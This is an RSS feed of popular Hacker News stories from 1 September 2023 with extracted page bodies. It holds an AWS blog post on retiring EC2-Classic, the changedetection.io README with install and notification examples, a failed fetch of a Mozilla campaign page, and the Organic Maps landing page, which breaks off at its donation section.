<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Fri, 01 Sep 2023 14:00:07 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Farewell EC2-Classic, it’s been swell (114 pts)]]></title>
            <link>https://www.allthingsdistributed.com/2023/09/farewell-ec2-classic.html</link>
            <guid>37349633</guid>
            <pubDate>Fri, 01 Sep 2023 11:57:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.allthingsdistributed.com/2023/09/farewell-ec2-classic.html">https://www.allthingsdistributed.com/2023/09/farewell-ec2-classic.html</a>, See on <a href="https://news.ycombinator.com/item?id=37349633">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><header></header><hr><section><p><time itemprop="datePublished" datetime="2023-09-01">September 01, 2023</time> • 839 words</p><span itemprop="articleBody"><p><img src="https://www.allthingsdistributed.com/images/farewell-ec2-classic-header.jpg" alt="EC2-Classic in a museum gallery" loading="lazy"></p><p>Retiring services isn’t something we do at AWS. It’s quite rare. Companies rely on our offerings – their businesses literally live on these services – and it’s something that we take seriously. For example SimpleDB is still around, even though DynamoDB is the “NoSQL” DB of choice for our customers.</p><p>So, two years ago, when <a href="https://aws.amazon.com/blogs/aws/ec2-classic-is-retiring-heres-how-to-prepare/">Jeff Barr announced that we’d be shutting down EC2-Classic</a>, I’m sure that there were at least <a href="https://news.ycombinator.com/item?id=27988964">a few of you</a> that didn’t believe we’d actually flip the switch — that we’d let it run forever. Well, that day has come. On August 15, 2023, we shut down the last instance of Classic. And with all of the history here, I think it’s worth celebrating the original version of one of the services that started what we now know as cloud computing.</p><p>EC2 has been around for quite a while, almost 17 years. Only SQS and S3 are older. So, I wouldn’t blame you if you were wondering what makes an EC2 instance “Classic”. Put simply, it’s the network architecture. When we launched EC2 in 2006, it was one giant network of 10.2.0.0/8. All instances ran on a single, flat network shared with other customers. It exposed a handful of features, like security groups and Public IP addresses that were assigned when an instance was spun up. Classic made the process of acquiring compute dead simple, even though the stack running behind the scenes was incredibly complex. “Invent and Simplify” is one of the <a href="https://www.amazon.jobs/content/en/our-workplace/leadership-principles">Amazon Leadership Principles</a> after all…</p><p>If you had launched an instance in 2006, an m1.small, you would have gotten a virtual CPU the equivalent of a 1.7 GHz Xeon processor with 1.75 GB of RAM, 160 GB of local disk, and 250 Mb/second of network bandwidth. And it would have cost just $0.10 per clocked hour. It’s quite incredible where cloud computing has gone since then, with a P3dn.24xlarge providing 100 Gbps of network throughput, 96 vCPUs, 8 NVIDIA v100 Tensor Core GPUs, 32 GiB of memory, and 1.8 TB of local SSD storage, not to mention an EFA to accelerate ML workloads.</p><p>But 2006 was a different time, and that flat network and small collection of instances, like the m1.small, was “Classic”. And at the time it was truly revolutionary. Hardware had become a programmable resource that you could scale up or down at a moment’s notice. Every developer, entrepreneur, startup and enterprise, now had access to as much compute as they wanted, whenever they wanted it. The complexities of managing infrastructure, buying new hardware, upgrading software, replacing failed disks — had been abstracted away. And it changed the way we all designed and built applications.</p><p>Of course the first thing I did when EC2 was launched was to move this blog to an M1.small. It was running <a href="https://movabletype.org/">Moveable Type</a> and the M1 was good enough run the server and the local (no RDS yet) database. Eventually I turned it into a highly-available service with RDS failover, etc., and it ran there for 5+ years until the <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteHosting.html">Amazon S3 Website feature</a> was released in 2011. The blog has now been “serverless” for the past 12 years.</p><p>Like we do with all of our services, we listened to what our customers needed next. This led us to adding features like Elastic IP addresses, Auto Scaling, Load Balancing, CloudWatch, and various new instance types that would better suit different workloads. By 2013 we had enabled VPC, which allowed each AWS customer to manage their own slice of the cloud, secure, isolated, and defined for their business. And it became the new standard. It simply gave customers a new level of control that enabled them to build even more comprehensive systems in the cloud.</p><p>We continued to support Classic for the next decade, even as EC2 evolved and we implemented an entirely new virtualization platform, <a href="https://www.allthingsdistributed.com/2020/09/reinventing-virtualization-with-nitro.html">Nitro</a> — because our customers were using it.</p><p>Ten years ago, during my 2013 keynote at re:Invent, I told you that we wanted to “support today’s workloads as well as tomorrow’s,” and our commitment to Classic is the best evidence of that. It’s not lost on me, the amount of work that goes into an effort like this — but it is exactly this type of work that builds trust, and I’m proud of the way it has been handled. To me, this embodies what it means to be customer obsessed. The EC2 team kept Classic running (and running well) until every instance was shut down or migrated. Providing documentation, tools, and support from engineering and account management teams throughout the process.</p><p>It’s bittersweet to say goodbye to one of our original offerings. But we’ve come a long way since 2006 and we’re not done innovating for our customers. It’s a reminder that building evolvable systems is a strategy, and revisiting your architectures with an open mind is a must. So, farewell Classic, it’s been swell. Long live EC2.</p><p><img src="https://www.allthingsdistributed.com/images/farewell-ec2-classic-certificate.png" alt="Certificate of achievement" loading="lazy"></p><p>Now, go build!</p><p>Recommended posts</p><ul><li><a href="https://www.allthingsdistributed.com/2019/08/modern-applications-at-aws.html?utm_campaign=related+posts&amp;utm_source=farewell+ec2+classic">Modern applications at AWS</a></li><li><a href="https://www.allthingsdistributed.com/2023/05/monoliths-are-not-dinosaurs.html?utm_campaign=related+posts&amp;utm_source=farewell+ec2+classic">Monoliths are not dinosaurs</a></li><li><a href="https://www.allthingsdistributed.com/2008/10/amazon_ec2_in_full_production.html?utm_campaign=related+posts&amp;utm_source=farewell+ec2+classic">Amazon EC2 in full production (2008)</a></li></ul></span></section><hr></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[ChangeDetection, monitor any website change (133 pts)]]></title>
            <link>https://github.com/dgtlmoon/changedetection.io</link>
            <guid>37348162</guid>
            <pubDate>Fri, 01 Sep 2023 08:27:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/dgtlmoon/changedetection.io">https://github.com/dgtlmoon/changedetection.io</a>, See on <a href="https://news.ycombinator.com/item?id=37348162">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">Web Site Change Detection, Restock monitoring and notifications.</h2>
<p dir="auto"><strong><em>Detect website content changes and perform meaningful actions - trigger notifications via Discord, Email, Slack, Telegram, API calls and many more.</em></strong></p>
<p dir="auto"><em>Live your data-life pro-actively.</em></p>
<p dir="auto"><a href="https://changedetection.io/?src=github" rel="nofollow"><img src="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/master/docs/screenshot.png" alt="Self-hosted web page change monitoring" title="Self-hosted web page change monitoring"></a></p>
<p dir="auto"><a href="https://github.com/dgtlmoon/changedetection.io/releases"><img src="https://camo.githubusercontent.com/a3687be13b5d64f53a3238de4e87a6bea1cb63d56305a29ab584a9b56810b496/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f762f72656c656173652f6467746c6d6f6f6e2f6368616e6765646574656374696f6e2e696f3f7374796c653d666f722d7468652d6261646765" alt="Release Version" data-canonical-src="https://img.shields.io/github/v/release/dgtlmoon/changedetection.io?style=for-the-badge"></a> <a href="https://hub.docker.com/r/dgtlmoon/changedetection.io" rel="nofollow"><img src="https://camo.githubusercontent.com/2256293975273cfbd0ceef0dc263be57720cbe32d9a2551ae2242e73ccf9d9e0/68747470733a2f2f696d672e736869656c64732e696f2f646f636b65722f70756c6c732f6467746c6d6f6f6e2f6368616e6765646574656374696f6e2e696f3f7374796c653d666f722d7468652d6261646765" alt="Docker Pulls" data-canonical-src="https://img.shields.io/docker/pulls/dgtlmoon/changedetection.io?style=for-the-badge"></a> <a href="https://github.com/dgtlmoon/changedetection.io/blob/master/LICENSE.md"><img src="https://camo.githubusercontent.com/c67edc2e120f9bd38b542a930f3e119cb09375785d9ce6f141f6f73ae036896b/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f6467746c6d6f6f6e2f6368616e6765646574656374696f6e2e696f2e7376673f7374796c653d666f722d7468652d6261646765" alt="License" data-canonical-src="https://img.shields.io/github/license/dgtlmoon/changedetection.io.svg?style=for-the-badge"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/dgtlmoon/changedetection.io/actions/workflows/test-only.yml/badge.svg?branch=master"><img src="https://github.com/dgtlmoon/changedetection.io/actions/workflows/test-only.yml/badge.svg?branch=master" alt="changedetection.io"></a></p>
<p dir="auto"><a href="https://changedetection.io/" rel="nofollow"><strong>Don't have time? Let us host it for you! try our $8.99/month subscription - use our proxies and support!</strong></a> , <em>half the price of other website change monitoring services!</em></p>
<ul dir="auto">
<li>Chrome browser included.</li>
<li>Super fast, no registration needed setup.</li>
<li>Get started watching and receiving website change notifications straight away.</li>
</ul>
<h3 tabindex="-1" dir="auto">Target specific parts of the webpage using the Visual Selector tool.</h3>
<p dir="auto">Available when connected to a <a href="https://github.com/dgtlmoon/changedetection.io/wiki/Playwright-content-fetcher">playwright content fetcher</a> (included as part of our subscription service)</p>
<p dir="auto"><a href="https://changedetection.io/?src=github" rel="nofollow"><img src="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/master/docs/visualselector-anim.gif" alt="Self-hosted web page change monitoring context difference " title="Self-hosted web page change monitoring context difference " data-animated-image=""></a></p>
<h3 tabindex="-1" dir="auto">Easily see what changed, examine by word, line, or individual character.</h3>
<p dir="auto"><a href="https://changedetection.io/?src=github" rel="nofollow"><img src="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/master/docs/screenshot-diff.png" alt="Self-hosted web page change monitoring context difference " title="Self-hosted web page change monitoring context difference "></a></p>
<h3 tabindex="-1" dir="auto">Perform interactive browser steps</h3>
<p dir="auto">Fill in text boxes, click buttons and more, setup your changedetection scenario.</p>
<p dir="auto">Using the <strong>Browser Steps</strong> configuration, add basic steps before performing change detection, such as logging into websites, adding a product to a cart, accept cookie logins, entering dates and refining searches.</p>
<p dir="auto"><a href="https://changedetection.io/?src=github" rel="nofollow"><img src="https://github.com/dgtlmoon/changedetection.io/raw/master/docs/browsersteps-anim.gif" alt="Self-hosted web page change monitoring context difference " title="Website change detection with interactive browser steps, login, cookies etc" data-animated-image=""></a></p>
<p dir="auto">After <strong>Browser Steps</strong> have been run, then visit the <strong>Visual Selector</strong> tab to refine the content you're interested in.
Requires Playwright to be enabled.</p>
<h3 tabindex="-1" dir="auto">Example use cases</h3>
<ul dir="auto">
<li>Products and services have a change in pricing</li>
<li><em>Out of stock notification</em> and <em>Back In stock notification</em></li>
<li>Monitor and track PDF file changes, know when a PDF file has text changes.</li>
<li>Governmental department updates (changes are often only on their websites)</li>
<li>New software releases, security advisories when you're not on their mailing list.</li>
<li>Festivals with changes</li>
<li>Discogs restock alerts and monitoring</li>
<li>Realestate listing changes</li>
<li>Know when your favourite whiskey is on sale, or other special deals are announced before anyone else</li>
<li>COVID related news from government websites</li>
<li>University/organisation news from their website</li>
<li>Detect and monitor changes in JSON API responses</li>
<li>JSON API monitoring and alerting</li>
<li>Changes in legal and other documents</li>
<li>Trigger API calls via notifications when text appears on a website</li>
<li>Glue together APIs using the JSON filter and JSON notifications</li>
<li>Create RSS feeds based on changes in web content</li>
<li>Monitor HTML source code for unexpected changes, strengthen your PCI compliance</li>
<li>You have a very sensitive list of URLs to watch and you do <em>not</em> want to use the paid alternatives. (Remember, <em>you</em> are the product)</li>
<li>Get notified when certain keywords appear in Twitter search results</li>
<li>Proactively search for jobs, get notified when companies update their careers page, search job portals for keywords.</li>
<li>Get alerts when new job positions are open on Bamboo HR and other job platforms</li>
<li>Website defacement monitoring</li>
<li>Pokémon Card Restock Tracker / Pokémon TCG Tracker</li>
<li>RegTech - stay ahead of regulatory changes, regulatory compliance</li>
</ul>
<p dir="auto"><em>Need an actual Chrome runner with Javascript support? We support fetching via WebDriver and Playwright!</em></p>
<h4 tabindex="-1" dir="auto">Key Features</h4>
<ul dir="auto">
<li>Lots of trigger filters, such as "Trigger on text", "Remove text by selector", "Ignore text", "Extract text", also using regular-expressions!</li>
<li>Target elements with xPath and CSS Selectors, Easily monitor complex JSON with JSONPath or jq</li>
<li>Switch between fast non-JS and Chrome JS based "fetchers"</li>
<li>Track changes in PDF files (Monitor text changed in the PDF, Also monitor PDF filesize and checksums)</li>
<li>Easily specify how often a site should be checked</li>
<li>Execute JS before extracting text (Good for logging in, see examples in the UI!)</li>
<li>Override Request Headers, Specify <code>POST</code> or <code>GET</code> and other methods</li>
<li>Use the "Visual Selector" to help target specific elements</li>
<li>Configurable <a href="https://github.com/dgtlmoon/changedetection.io/wiki/Proxy-configuration">proxy per watch</a></li>
<li>Send a screenshot with the notification when a change is detected in the web page</li>
</ul>
<p dir="auto">We <a href="https://brightdata.grsm.io/n0r16zf7eivq" rel="nofollow">recommend and use Bright Data</a> global proxy services, Bright Data will match any first deposit up to $100 using our signup link.</p>
<p dir="auto">Please ⭐ star ⭐ this project and help it grow! <a href="https://github.com/dgtlmoon/changedetection.io/">https://github.com/dgtlmoon/changedetection.io/</a></p>
<h2 tabindex="-1" dir="auto">Installation</h2>
<h3 tabindex="-1" dir="auto">Docker</h3>
<p dir="auto">With Docker composer, just clone this repository and..</p>

<p dir="auto">Docker standalone</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ docker run -d --restart always -p &quot;127.0.0.1:5000:5000&quot; -v datastore-volume:/datastore --name changedetection.io dgtlmoon/changedetection.io"><pre>$ docker run -d --restart always -p <span><span>"</span>127.0.0.1:5000:5000<span>"</span></span> -v datastore-volume:/datastore --name changedetection.io dgtlmoon/changedetection.io</pre></div>
<p dir="auto"><code>:latest</code> tag is our latest stable release, <code>:dev</code> tag is our bleeding edge <code>master</code> branch.</p>
<p dir="auto">Alternative docker repository over at ghcr - <a href="https://ghcr.io/dgtlmoon/changedetection.io" rel="nofollow">ghcr.io/dgtlmoon/changedetection.io</a></p>
<h3 tabindex="-1" dir="auto">Windows</h3>
<p dir="auto">See the install instructions at the wiki <a href="https://github.com/dgtlmoon/changedetection.io/wiki/Microsoft-Windows">https://github.com/dgtlmoon/changedetection.io/wiki/Microsoft-Windows</a></p>
<h3 tabindex="-1" dir="auto">Python Pip</h3>
<p dir="auto">Check out our pypi page <a href="https://pypi.org/project/changedetection.io/" rel="nofollow">https://pypi.org/project/changedetection.io/</a></p>
<div dir="auto" data-snippet-clipboard-copy-content="$ pip3 install changedetection.io
$ changedetection.io -d /path/to/empty/data/dir -p 5000"><pre>$ pip3 install changedetection.io
$ changedetection.io -d /path/to/empty/data/dir -p 5000</pre></div>
<p dir="auto">Then visit <a href="http://127.0.0.1:5000/" rel="nofollow">http://127.0.0.1:5000</a> , You should now be able to access the UI.</p>
<p dir="auto"><em>Now with per-site configurable support for using a fast built in HTTP fetcher or use a Chrome based fetcher for monitoring of JavaScript websites!</em></p>
<h2 tabindex="-1" dir="auto">Updating changedetection.io</h2>
<h3 tabindex="-1" dir="auto">Docker</h3>
<div data-snippet-clipboard-copy-content="docker pull dgtlmoon/changedetection.io
docker kill $(docker ps -a -f name=changedetection.io -q)
docker rm $(docker ps -a -f name=changedetection.io -q)
docker run -d --restart always -p &quot;127.0.0.1:5000:5000&quot; -v datastore-volume:/datastore --name changedetection.io dgtlmoon/changedetection.io"><pre><code>docker pull dgtlmoon/changedetection.io
docker kill $(docker ps -a -f name=changedetection.io -q)
docker rm $(docker ps -a -f name=changedetection.io -q)
docker run -d --restart always -p "127.0.0.1:5000:5000" -v datastore-volume:/datastore --name changedetection.io dgtlmoon/changedetection.io
</code></pre></div>
<h3 tabindex="-1" dir="auto">docker-compose</h3>
<div dir="auto" data-snippet-clipboard-copy-content="docker-compose pull &amp;&amp; docker-compose up -d"><pre>docker-compose pull <span>&amp;&amp;</span> docker-compose up -d</pre></div>
<p dir="auto">See the wiki for more information <a href="https://github.com/dgtlmoon/changedetection.io/wiki">https://github.com/dgtlmoon/changedetection.io/wiki</a></p>
<h2 tabindex="-1" dir="auto">Filters</h2>
<p dir="auto">XPath, JSONPath, jq, and CSS support comes baked in! You can be as specific as you need, use XPath exported from various XPath element query creation tools.
(We support LXML <code>re:test</code>, <code>re:match</code> and <code>re:replace</code>.)</p>
<h2 tabindex="-1" dir="auto">Notifications</h2>
<p dir="auto">ChangeDetection.io supports a massive amount of notifications (including email, office365, custom APIs, etc) when a web-page has a change detected thanks to the <a href="https://github.com/caronc/apprise">apprise</a> library.
Simply set one or more notification URL's in the <em>[edit]</em> tab of that watch.</p>
<p dir="auto">Just some examples</p>
<div data-snippet-clipboard-copy-content="discord://webhook_id/webhook_token
flock://app_token/g:channel_id
gitter://token/room
gchat://workspace/key/token
msteams://TokenA/TokenB/TokenC/
o365://TenantID:AccountEmail/ClientID/ClientSecret/TargetEmail
rocket://user:password@hostname/#Channel
mailto://user:pass@example.com?to=receivingAddress@example.com
json://someserver.com/custom-api
syslog://"><pre><code>discord://webhook_id/webhook_token
flock://app_token/g:channel_id
gitter://token/room
gchat://workspace/key/token
msteams://TokenA/TokenB/TokenC/
o365://TenantID:AccountEmail/ClientID/ClientSecret/TargetEmail
rocket://user:password@hostname/#Channel
mailto://user:pass@example.com?to=receivingAddress@example.com
json://someserver.com/custom-api
syslog://
</code></pre></div>
<p dir="auto"><a href="https://github.com/caronc/apprise#popular-notification-services">And everything else in this list!</a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/master/docs/screenshot-notifications.png"><img src="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/master/docs/screenshot-notifications.png" alt="Self-hosted web page change monitoring notifications" title="Self-hosted web page change monitoring notifications"></a></p>
<p dir="auto">Now you can also customise your notification content and use <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/" rel="nofollow">Jinja2 templating</a> for their title and body!</p>
<h2 tabindex="-1" dir="auto">JSON API Monitoring</h2>
<p dir="auto">Detect changes and monitor data in JSON API's by using either JSONPath or jq to filter, parse, and restructure JSON as needed.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/master/docs/json-filter-field-example.png"><img src="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/master/docs/json-filter-field-example.png" alt="image"></a></p>
<p dir="auto">This will re-parse the JSON and apply formatting to the text, making it super easy to monitor and detect changes in JSON API results</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/master/docs/json-diff-example.png"><img src="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/master/docs/json-diff-example.png" alt="image"></a></p>
<h3 tabindex="-1" dir="auto">JSONPath or jq?</h3>
<p dir="auto">For more complex parsing, filtering, and modifying of JSON data, jq is recommended due to the built-in operators and functions. Refer to the <a href="https://stedolan.github.io/jq/manual/" rel="nofollow">documentation</a> for more specifc information on jq.</p>
<p dir="auto">One big advantage of <code>jq</code> is that you can use logic in your JSON filter, such as filters to only show items that have a value greater than/less than etc.</p>
<p dir="auto">See the wiki <a href="https://github.com/dgtlmoon/changedetection.io/wiki/JSON-Selector-Filter-help">https://github.com/dgtlmoon/changedetection.io/wiki/JSON-Selector-Filter-help</a> for more information and examples</p>
<h3 tabindex="-1" dir="auto">Parse JSON embedded in HTML!</h3>
<p dir="auto">When you enable a <code>json:</code> or <code>jq:</code> filter, you can even automatically extract and parse embedded JSON inside a HTML page! Amazingly handy for sites that build content based on JSON, such as many e-commerce websites.</p>
<div data-snippet-clipboard-copy-content="<html>
...
<script type=&quot;application/ld+json&quot;>

{
   &quot;@context&quot;:&quot;http://schema.org/&quot;,
   &quot;@type&quot;:&quot;Product&quot;,
   &quot;offers&quot;:{
      &quot;@type&quot;:&quot;Offer&quot;,
      &quot;availability&quot;:&quot;http://schema.org/InStock&quot;,
      &quot;price&quot;:&quot;3949.99&quot;,
      &quot;priceCurrency&quot;:&quot;USD&quot;,
      &quot;url&quot;:&quot;https://www.newegg.com/p/3D5-000D-001T1&quot;
   },
   &quot;description&quot;:&quot;Cobratype King Cobra Hero Desktop Gaming PC&quot;,
   &quot;name&quot;:&quot;Cobratype King Cobra Hero Desktop Gaming PC&quot;,
   &quot;sku&quot;:&quot;3D5-000D-001T1&quot;,
   &quot;itemCondition&quot;:&quot;NewCondition&quot;
}
</script>"><pre><code>&lt;html&gt;
...
&lt;script type="application/ld+json"&gt;

{
   "@context":"http://schema.org/",
   "@type":"Product",
   "offers":{
      "@type":"Offer",
      "availability":"http://schema.org/InStock",
      "price":"3949.99",
      "priceCurrency":"USD",
      "url":"https://www.newegg.com/p/3D5-000D-001T1"
   },
   "description":"Cobratype King Cobra Hero Desktop Gaming PC",
   "name":"Cobratype King Cobra Hero Desktop Gaming PC",
   "sku":"3D5-000D-001T1",
   "itemCondition":"NewCondition"
}
&lt;/script&gt;
</code></pre></div>
<p dir="auto"><code>json:$..price</code> or <code>jq:..price</code> would give <code>3949.99</code>, or you can extract the whole structure (use a JSONpath test website to validate with)</p>
<p dir="auto">The application also supports notifying you that it can follow this information automatically</p>
<h2 tabindex="-1" dir="auto">Proxy Configuration</h2>
<p dir="auto">See the wiki <a href="https://github.com/dgtlmoon/changedetection.io/wiki/Proxy-configuration">https://github.com/dgtlmoon/changedetection.io/wiki/Proxy-configuration</a> , we also support using <a href="https://github.com/dgtlmoon/changedetection.io/wiki/Proxy-configuration#brightdata-proxy-support">BrightData proxy services where possible</a></p>
<h2 tabindex="-1" dir="auto">Raspberry Pi support?</h2>
<p dir="auto">Raspberry Pi and linux/arm/v6 linux/arm/v7 arm64 devices are supported! See the wiki for <a href="https://github.com/dgtlmoon/changedetection.io/wiki/Fetching-pages-with-WebDriver">details</a></p>
<h2 tabindex="-1" dir="auto">API Support</h2>
<p dir="auto">Supports managing the website watch list <a href="https://changedetection.io/docs/api_v1/index.html" rel="nofollow">via our API</a></p>
<h2 tabindex="-1" dir="auto">Support us</h2>
<p dir="auto">Do you use changedetection.io to make money? does it save you time or money? Does it make your life easier? less stressful? Remember, we write this software when we should be doing actual paid work, we have to buy food and pay rent just like you.</p>
<p dir="auto">Firstly, consider taking out a <a href="https://changedetection.io/?src=github" rel="nofollow">change detection monthly subscription - unlimited checks and watches</a> , even if you don't use it, you still get the warm fuzzy feeling of helping out the project. (And who knows, you might just use it!)</p>
<p dir="auto">Or directly donate an amount PayPal <a href="https://www.paypal.com/donate/?hosted_button_id=7CP6HR9ZCNDYJ" rel="nofollow"><img src="https://camo.githubusercontent.com/2bfa6102e99ff9a137185897b0a566aa0977a4790348c462e6951829e787af8f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f6e6174652d50617950616c2d677265656e2e737667" alt="Donate" data-canonical-src="https://img.shields.io/badge/Donate-PayPal-green.svg"></a></p>
<p dir="auto">Or BTC <code>1PLFN327GyUarpJd7nVe7Reqg9qHx5frNn</code></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/master/docs/btc-support.png"><img src="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/master/docs/btc-support.png" alt="Support us!"></a></p>
<h2 tabindex="-1" dir="auto">Commercial Support</h2>
<p dir="auto">I offer commercial support, this software is depended on by network security, aerospace , data-science and data-journalist professionals just to name a few, please reach out at <a href="mailto:dgtlmoon@gmail.com">dgtlmoon@gmail.com</a> for any enquiries, I am more than glad to work with your organisation to further the possibilities of what can be done with changedetection.io</p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ask Microsoft: Are you using our personal data to train AI? (412 pts)]]></title>
            <link>https://foundation.mozilla.org/en/campaigns/microsoft-ai/</link>
            <guid>37347528</guid>
            <pubDate>Fri, 01 Sep 2023 06:31:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://foundation.mozilla.org/en/campaigns/microsoft-ai/">https://foundation.mozilla.org/en/campaigns/microsoft-ai/</a>, See on <a href="https://news.ycombinator.com/item?id=37347528">Hacker News</a></p>
Couldn't get https://foundation.mozilla.org/en/campaigns/microsoft-ai/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Organic Maps (549 pts)]]></title>
            <link>https://organicmaps.app/</link>
            <guid>37347447</guid>
            <pubDate>Fri, 01 Sep 2023 06:16:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://organicmaps.app/">https://organicmaps.app/</a>, See on <a href="https://news.ycombinator.com/item?id=37347447">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

<p><strong>Organic Maps</strong> is a free Android &amp; iOS offline maps app for travelers, tourists, hikers, and cyclists based on top of crowd-sourced <strong><a rel="noopener" target="_blank" title="OpenStreetMap" href="https://www.openstreetmap.org/about">OpenStreetMap</a></strong> data. It is a privacy-focused, open-source <a rel="noopener" target="_blank" href="https://en.wikipedia.org/wiki/Fork_(software_development)">fork</a> of <strong>Maps.me</strong> app (previously known as <a rel="noopener" target="_blank" title="Maps.Me" href="https://en.wikipedia.org/wiki/Maps.me"><strong>MapsWithMe</strong></a>), maintained by the same people who created <strong>MapsWithMe</strong> in 2011.</p>
<p><strong>Organic Maps</strong> is one of a few applications nowadays that supports 100% of features without an active Internet connection. Install Organic Maps, download maps, throw away your SIM card (by the way, your operator constantly tracks you), and go for a weeklong trip on a single battery charge without any byte sent to the network.</p>
<h3 id="install">Download and install Organic Maps from <a rel="noopener" target="_blank" title="Install Organic Maps from the AppStore" href="https://apps.apple.com/app/organic-maps/id1567437057">AppStore</a>, <a rel="noopener" target="_blank" title="Install Organic Maps from Google Play" href="https://play.google.com/store/apps/details?id=app.organicmaps&amp;hl=en">Google Play</a>, <a rel="noopener" target="_blank" title="Install Organic Maps from F-Droid" href="https://f-droid.org/en/packages/app.organicmaps/">FDroid</a>, <a rel="noopener" target="_blank" title="Install Organic Maps from Huawei AppGallery" href="https://appgallery.huawei.com/#/app/C104325611?local=en">Huawei AppGallery</a></h3>
<p><span><a rel="noopener" target="_blank" title="Install Organic Maps from the AppStore" href="https://apps.apple.com/app/organic-maps/id1567437057"><img src="https://organicmaps.app/images/badges/apple-appstore.svg" alt=""></a></span>
<span><a rel="noopener" target="_blank" title="Install Organic Maps from Google Play" href="https://play.google.com/store/apps/details?id=app.organicmaps&amp;hl=en"><img src="https://organicmaps.app/images/badges/googleplay.svg" alt=""></a></span>
<span><a rel="noopener" target="_blank" title="Install Organic Maps from F-Droid" href="https://f-droid.org/en/packages/app.organicmaps/"><img src="https://organicmaps.app/images/badges/f-droid.svg" alt=""></a></span>
<span><a rel="noopener" target="_blank" title="Install Organic Maps from Huawei AppGallery" href="https://appgallery.huawei.com/#/app/C104325611?local=en"><img src="https://organicmaps.app/images/badges/huawei-appgallery.svg" alt=""></a></span></p>
<img src="https://organicmaps.app/images/screenshots/hiking.jpg" alt="Hiking" title="Hiking">
<img src="https://organicmaps.app/images/screenshots/prague.jpg" alt="Prague" title="Prague">
<img src="https://organicmaps.app/images/screenshots/search.jpg" alt="Offline Search" title="Offline Search">
<img src="https://organicmaps.app/images/screenshots/dark.jpg" alt="Navigation in dark mode" title="Navigation in dark mode">
<h2 id="features">Features</h2>
<p>Organic Maps is the ultimate companion app for travelers, tourists, hikers, and cyclists:</p>
<ul>
<li>Detailed offline maps with places that don't exist on other maps, thanks to <a rel="noopener" target="_blank" title="OpenStreetMap" href="https://www.openstreetmap.org/about">OpenStreetMap</a></li>
<li>Cycling routes, hiking trails, and walking paths</li>
<li>Contour lines, elevation profiles, peaks, and slopes</li>
<li>Turn-by-turn walking, cycling, and car navigation with voice guidance</li>
<li>Fast offline search on the map</li>
<li>Bookmarks and tracks in KML, KMZ, GPX formats</li>
<li>Dark Mode to protect your eyes</li>
<li>Countries and regions don't take a lot of space</li>
<li>Free and open-source</li>
</ul>
<h2 id="why-organic">Why Organic?</h2>
<p>Organic Maps is pure and organic, made with love:</p>
<ul>
<li>Respects your privacy</li>
<li>Saves your battery</li>
<li>No unexpected mobile data charges</li>
</ul>
<p>Organic Maps app is free from trackers and other bad stuff:</p>
<ul>
<li>No ads</li>
<li>No tracking</li>
<li>No data collection</li>
<li>No phoning home</li>
<li>No annoying registration</li>
<li>No mandatory tutorials</li>
<li>No noisy email spam</li>
<li>No push notifications</li>
<li>No crapware</li>
<li><del>No pesticides</del> Purely organic!</li>
</ul>
<p>The application is verified by <a rel="noopener" target="_blank" href="https://reports.exodus-privacy.eu.org/en/reports/app.organicmaps/latest/">Exodus Privacy Project</a>:</p>
<img src="https://organicmaps.app/images/privacy/exodus.png" width="400">
<p>The iOS application is verified by <a rel="noopener" target="_blank" href="https://ios.trackercontrol.org/app/app.organicmaps">TrackerControl for iOS</a>:</p>
<img src="https://organicmaps.app/images/privacy/trackercontrol.png" width="400">
<p>Organic Maps doesn't request excessive permissions to spy on you:</p>
<img src="https://organicmaps.app/images/privacy/om.jpg" width="400">
<img src="https://organicmaps.app/images/privacy/mm.jpg" width="400">
<p>At Organic Maps, we believe that privacy is a fundamental human right:</p>
<ul>
<li>Organic Maps is an indie community-driven open-source project</li>
<li>We protect your privacy from Big Tech's prying eyes</li>
<li>Stay safe no matter wherever you are</li>
</ul>
<p>Reject surveillance - embrace your freedom.</p>
<p><strong><a href="https://organicmaps.app/#install">Give Organic Maps a try!</a></strong></p>
<h2 id="who-is-paying-for-the-free-app">Who is paying for the free app?</h2>
<p>The app is free for everyone. Please <a href="https://organicmaps.app/donate/">donate</a> to support us!</p>
<p>To donate immediately, click a preferred payment method icon below:</p>


